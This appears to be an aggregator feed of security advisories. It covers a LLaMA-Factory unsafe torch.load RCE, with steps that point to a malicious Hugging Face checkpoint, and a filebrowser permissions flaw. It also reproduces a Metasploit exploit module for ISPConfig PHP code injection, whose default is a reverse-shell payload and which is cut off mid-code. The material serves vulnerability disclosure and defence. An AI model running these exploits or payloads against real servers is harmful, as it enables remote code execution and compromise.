    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-xj56-p8mm-qmxj">https://github.com/advisories/GHSA-xj56-p8mm-qmxj</a></p><p><strong>仓库 Star：</strong> 53073</p><p><strong>CVSS 评分：</strong> 8.3</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-xj56-p8mm-qmxj">https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-xj56-p8mm-qmxj</a></p></li><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-53002">https://nvd.nist.gov/vuln/detail/CVE-2025-53002</a></p></li><li><p><a href="https://github.com/hiyouga/LLaMA-Factory/commit/bb7bf51554d4ba8432333c35a5e3b52705955ede">https://github.com/hiyouga/LLaMA-Factory/commit/bb7bf51554d4ba8432333c35a5e3b52705955ede</a></p></li><li><p><a href="https://github.com/advisories/GHSA-xj56-p8mm-qmxj">https://github.com/advisories/GHSA-xj56-p8mm-qmxj</a></p></li></ul><p><strong>描述：</strong></p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>A critical remote code execution vulnerability was discovered during the Llama Factory training process. This vulnerability arises because the <code>vhead_file</code> is loaded without proper safeguards, allowing malicious attackers to execute arbitrary malicious code on the host system simply by passing a malicious <code>Checkpoint path</code> parameter through the <code>WebUI</code> interface. The attack is stealthy, as the victim remains unaware of the exploitation. The root cause is that the <code>vhead_file</code> argument is loaded without the secure parameter <code>weights_only=True</code>.</p><p>Note: In torch versions &lt;2.6, the default setting is <code>weights_only=False</code>, and Llama Factory’s <code>setup.py</code> only requires <code>torch&gt;=2.0.0</code>.</p><h3 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h3><p>Llama Factory versions &lt;&#x3D;0.9.3 are affected by this vulnerability.</p><h3 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h3><ol><li>In LLaMA Factory’s WebUI, when a user sets the <code>Checkpoint path</code>, it modifies the <code>adapter_name_or_path</code> parameter passed to the training process.<br>code in src&#x2F;llamafactory&#x2F;webui&#x2F;runner.py</li></ol><img width="1040" alt="image-1" src="https://github.com/user-attachments/assets/c8bc79e4-ce7d-43c9-b0fd-e37c235e6585" /><ol start="2"><li>The <code>adapter_name_or_path</code> passed to the training process is then used in <code>src/llamafactory/model/model_utils/valuehead.py</code> to fetch the corresponding <code>value_head.bin</code> file from Hugging Face. This file is subsequently loaded via <code>torch.load()</code> without the security parameter <code>weights_only=True</code> being set, resulting in remote code execution.<br>code in src&#x2F;llamafactory&#x2F;model&#x2F;model_utils&#x2F;valuehead.py</li></ol><img width="1181" alt="image-2" src="https://github.com/user-attachments/assets/6edbe694-0c60-4a54-bfb3-5e1042c9230d" /><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><h4 id="Steps-to-Reproduce"><a href="#Steps-to-Reproduce" class="headerlink" title="Steps to Reproduce"></a>Steps to Reproduce</h4><ol><li>Deploy llama factory.</li><li>Remote attack through the WebUI interface<ol><li>Configure <code>Model name</code> and <code>Model path</code>  correctly. For demonstration purposes, we’ll use a small model <code>llamafactory/tiny-random-Llama-3</code> to accelerate model loading.</li><li>Set <code>Finetuning method</code> to <code>LoRA</code> and <code>Train Stage</code> to <code>Reward Modeling</code>. The vulnerability is specifically triggered during the Reward Modeling training stage.</li><li>Input a malicious Hugging Face path in <code>Checkpoint path</code> – here we use <code>paulinsider/llamafactory-hack</code>. This repository(<a href="https://huggingface.co/paulinsider/llamafactory-hack/tree/main">https://huggingface.co/paulinsider/llamafactory-hack/tree/main</a> ) contains a malicious <code>value_head.bin</code> file. The generation method for this file is as follows (it can execute arbitrary attack commands; for demonstration, we configured it to create a <code>HACKED!</code> folder).</li><li>Click <code>Start</code> to begin training. After a brief wait, a <code>HACKED!</code> folder will be created on the server. Note that arbitrary malicious code could be executed through this method.</li></ol></li></ol><p><strong>The video demonstration of the vulnerability exploitation is available at the</strong> <a href="https://drive.google.com/file/d/1AddKm2mllsXfuvL4Tvbn_WJdjEOYXx4y/view?usp=sharing">Google Drive Link</a> </p><h3 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h3><p>Exploitation of this vulnerability allows remote attackers to:</p><ul><li>Execute arbitrary malicious code &#x2F; OS commands on the server.</li><li>Potentially compromise sensitive data or escalate privileges.</li><li>Deploy malware or create persistent backdoors in the system.<br>This significantly increases the risk of data breaches and operational disruption.</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-xj56-p8mm-qmxj&quot;&gt;https://github.com/advisories/GHSA-xj56-p8mm-qmxj&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/06/27/twitter_3724750130/"/>
    <id>http://example.com/2025/06/27/twitter_3724750130/</id>
    <published>2025-06-27T15:00:29.739Z</published>
    <updated>2025-06-27T15:00:29.735Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 加入#BHUSA培训课程“Azure黑客基础”，这是一门为初学者提供的Azure渗透测试全面入门课程。本课程涵盖理论概念、实操练习以及突破Azure云的实用策略。通过大约20个实操实验室，您将学习在攻击实时Azure环境时遵循威胁行为者的战术、技术和程序（TTPs）！立即预订您的位置 &gt;&gt; <a href="https://t.co/aTW7AzVy7N">https://t.co/aTW7AzVy7N</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1938606020621721827">https://x.com/BlackHatEvents/status/1938606020621721827</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 加入#BHUSA培训课程“Azure黑客基础”，这是一门为初学者提供的Azure渗透测试全面入门课程。本课程涵盖理论概念、实操练习以及突破Azur</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>filebrowser Sets Insecure File Permissions</title>
    <link href="http://example.com/2025/06/27/github_2109110443/"/>
    <id>http://example.com/2025/06/27/github_2109110443/</id>
    <published>2025-06-27T15:00:07.118Z</published>
    <updated>2025-06-27T15:00:07.114Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-jj2r-455p-5gvf">https://github.com/advisories/GHSA-jj2r-455p-5gvf</a></p><p><strong>仓库 Star：</strong> 29896</p><p><strong>CVSS 评分：</strong> 5.5</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-jj2r-455p-5gvf">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-jj2r-455p-5gvf</a></p></li><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52900">https://nvd.nist.gov/vuln/detail/CVE-2025-52900</a></p></li><li><p><a href="https://github.com/filebrowser/filebrowser/commit/ca86f916216620365c0f81629c0934ce02574d76">https://github.com/filebrowser/filebrowser/commit/ca86f916216620365c0f81629c0934ce02574d76</a></p></li><li><p><a href="https://github.com/advisories/GHSA-jj2r-455p-5gvf">https://github.com/advisories/GHSA-jj2r-455p-5gvf</a></p></li></ul><p><strong>描述：</strong></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>The file access permissions for files uploaded to or created from File Browser are never explicitly set by the application.<br>The same is true for the database used by File Browser. On standard servers where the <em>umask</em> configuration has not been hardened before, this makes all the stated files readable by any operating system account.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>The default permissions for new files on a standard Linux system are <code>0644</code>, making them world-readable.<br>That means that at least the following parties have full read access to all files managed by the Filebrowser from all <em>scopes</em>, as well as its database (including the password hashes stored in there):</p><ul><li>All OS accounts on the server</li><li>All other applications running on the same server</li><li>Any Filebrowser user with <em>Command Execution</em> privileges having access to a command that allows reading a file’s content</li></ul><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>On a Linux system, the file access permissions of new files are designated by the system wide <em>umask</em> setting, unless they are configured manually.<br>Most distributions set this value to <code>022</code> by default which gives every account on the system read permissions on the file.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">umask</span><br>022<br>$ <span class="hljs-built_in">touch</span> foo<br>$ <span class="hljs-built_in">ls</span> -l foo<br>-rw-r--r-- 1 sba sba 0 31. Mär 15:08 foo<br></code></pre></td></tr></table></figure><h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h2><p>Upload or create a file in the Filebrowser GUI and list the directory contents from a shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span> -l /srv/filebrowser/testdir<br>total 12<br>-rw-r--r-- 1 sba sba 7703 Mar 25 16:07 dummy1.pdf<br>-rw-r--r-- 1 sba sba    3 Mar 25 15:46 testfile.txt<br></code></pre></td></tr></table></figure><p>The same can be validated for Docker based deployments within the container:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ docker <span class="hljs-built_in">exec</span> -it e0f075082a2c <span class="hljs-built_in">ls</span> /srv/testdir -l<br>total 12<br>-rw-r--r--    1 1000     1000          7703 Mar 25 15:07 dummy1.pdf<br>-rw-r--r--    1 1000     1000             3 Mar 25 14:46 testfile.txt<br></code></pre></td></tr></table></figure><p>Furthermore, the database used by the Filebrowser application is readable by any account:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span> -l /srv/filebrowser/filebrowser.db <br>-rw-rw-r-- 1 sba sba 65536 Mar 25 09:58 /srv/filebrowser/filebrowser.db<br></code></pre></td></tr></table></figure><h2 id="Recommended-Countermeasures"><a href="#Recommended-Countermeasures" class="headerlink" title="Recommended Countermeasures"></a>Recommended Countermeasures</h2><p>Since the system’s <em>umask</em> configuration cannot be controlled by the Filebrowser, the application needs to set the permissions of all new files manually upon creation.<br>No permissions should be given to the <em>other</em> category.</p><p>Implementing this won’t fix the permissions for active instances after an update, so site administrators will need to fix the permissions manually:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">chmod</span> o-rwx -R /srv/filebrowser/datadir<br></code></pre></td></tr></table></figure><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><code>2025-03-25</code> Identified the vulnerability in version 2.32.0</li><li><code>2025-04-11</code> Contacted the project</li><li><code>2025-04-18</code> Vulnerability disclosed to the project</li><li><code>2025-06-25</code> Uploaded advisories to the project’s GitHub repository</li><li><code>2025-06-26</code> CVE ID assigned by GitHub</li><li><code>2025-06-26</code> Fix released with version 2.33.7</li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://cwe.mitre.org/data/definitions/276.html">CWE-276: Incorrect Default Permissions</a></li><li><a href="https://www.cyberciti.biz/tips/understanding-linux-unix-umask-value-usage.html">What is Umask and How To Setup Default umask Under Linux?</a></li></ul><h2 id="Credits"><a href="#Credits" class="headerlink" title="Credits"></a>Credits</h2><ul><li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-jj2r-455p-5gvf&quot;&gt;https://github.com/advisories/GHSA-jj2r-455p-5gvf&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>ISPConfig language_editphp PHP代码注入</title>
    <link href="http://example.com/2025/06/27/github_146255217/"/>
    <id>http://example.com/2025/06/27/github_146255217/</id>
    <published>2025-06-27T14:45:15.817Z</published>
    <updated>2025-06-27T14:45:15.815Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ISPConfig language_edit.php PHP代码注入</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-46818</li></ul><p><strong>漏洞类型：</strong> 代码注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> ISPConfig在3.2.11p1之前的版本中存在一个PHP代码注入漏洞，允许管理员在语言文件编辑器中注入PHP代码，前提是admin_allow_langedit功能已启用。</p><p><strong>产品厂商：</strong> ISPConfig</p><p><strong>产品名称：</strong> ISPConfig</p><p><strong>影响版本：</strong> version &lt; 3.2.11p1</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/840ae0f317b2910b7c83284d5139adb565618c2b/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb">https://github.com/rapid7/metasploit-framework/blob/840ae0f317b2910b7c83284d5139adb565618c2b/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote<br>  Rank = ExcellentRanking<br><br>  prepend Msf::Exploit::Remote::AutoCheck<br>  include Msf::Exploit::Remote::HttpClient<br>  include Msf::Exploit::FileDropper<br><br>  def initialize(info = &#123;&#125;)<br>    super(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;ISPConfig language_edit.php PHP Code Injection&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          An issue was discovered <span class="hljs-keyword">in</span> ISPConfig before <span class="hljs-number">3.2</span>.<span class="hljs-number">11p</span>1. PHP code injection can be achieved <span class="hljs-keyword">in</span> the language file editor <span class="hljs-keyword">by</span> an admin <span class="hljs-keyword">if</span> admin_allow_langedit <span class="hljs-keyword">is</span> enabled.<br>        &#125;,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;syfi&#x27;</span>, <span class="hljs-comment"># Discovery and PoC</span><br>          <span class="hljs-string">&#x27;Egidio Romano&#x27;</span><br>        ],<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://github.com/SyFi/CVE-2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/KIS-2023-13&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/pocs/CVE-2023-46818.php&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_PHP,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Automatic PHP&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_PHP<br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2023-10-24&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;PAYLOAD&#x27;</span> =&gt; <span class="hljs-string">&#x27;php/meterpreter/reverse_tcp&#x27;</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [CRASH_SAFE],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [REPEATABLE_SESSION],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [IOC_IN_LOGS]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;TARGETURI&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;The URI path to ISPConfig&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator username&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator password&#x27;</span>])<br>    ])<br>  end<br><br>  def check<br>    print_status(<span class="hljs-string">&#x27;Checking if the target is ISPConfig...&#x27;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>)<br>    &#125;)<br>    <span class="hljs-keyword">return</span> CheckCode::Unknown <span class="hljs-keyword">unless</span> res<br><br>    <span class="hljs-comment"># Try to log in and parse version if credentials are provided</span><br>    <span class="hljs-keyword">if</span> datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>] &amp;&amp; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]<br>      login_res = send_request_cgi(&#123;<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>),<br>        <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;username&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>          <span class="hljs-string">&#x27;password&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>          <span class="hljs-string">&#x27;s_mod&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>      &#125;)<br>      <span class="hljs-keyword">if</span> login_res &amp;&amp; (login_res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>]&amp;.include?(<span class="hljs-string">&#x27;admin&#x27;</span>) || login_res.body.downcase.include?(<span class="hljs-string">&#x27;dashboard&#x27;</span>))<br>        <span class="hljs-comment"># Try to access the dashboard or settings page</span><br>        settings_res = send_request_cgi(&#123;<br>          <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>          <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;index.php&#x27;</span>),<br>          <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>        &#125;)<br>        <span class="hljs-keyword">if</span> settings_res<br>          doc = settings_res.get_html_document<br>          <span class="hljs-comment"># Try to find version in a span, div, or similar element</span><br>          version_text = doc.text[<span class="hljs-regexp">/ISPConfig\s*v?(\d+\.\d+(?:\.\d+)?(?:p\d+)?)/i</span>, <span class="hljs-number">1</span>]<br>          <span class="hljs-keyword">if</span> version_text<br>            print_good(<span class="hljs-string">&quot;ISPConfig version detected: <span class="hljs-subst">#&#123;version_text&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> CheckCode::Appears(<span class="hljs-string">&quot;Version: <span class="hljs-subst">#&#123;version_text&#125;</span>&quot;</span>)<br>          end<br>        end<br>      end<br>    end<br><br>    <span class="hljs-comment"># Fallback to the previous check</span><br>    <span class="hljs-keyword">if</span> res.body.include?(<span class="hljs-string">&#x27;ISPConfig&#x27;</span>) &amp;&amp; (res.body.include?(<span class="hljs-string">&#x27;login&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;username&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;password&#x27;</span>))<br>      print_good(<span class="hljs-string">&#x27;ISPConfig installation detected&#x27;</span>)<br>      <span class="hljs-keyword">return</span> CheckCode::Detected<br>    end<br>    CheckCode::Safe<br>  end<br><br>  def authenticate<br>    print_status(<span class="hljs-string">&quot;Attempting login with username &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]&#125;</span>&#x27; and password &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]&#125;</span>&#x27;&quot;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;password&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>        <span class="hljs-string">&#x27;s_mod&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span 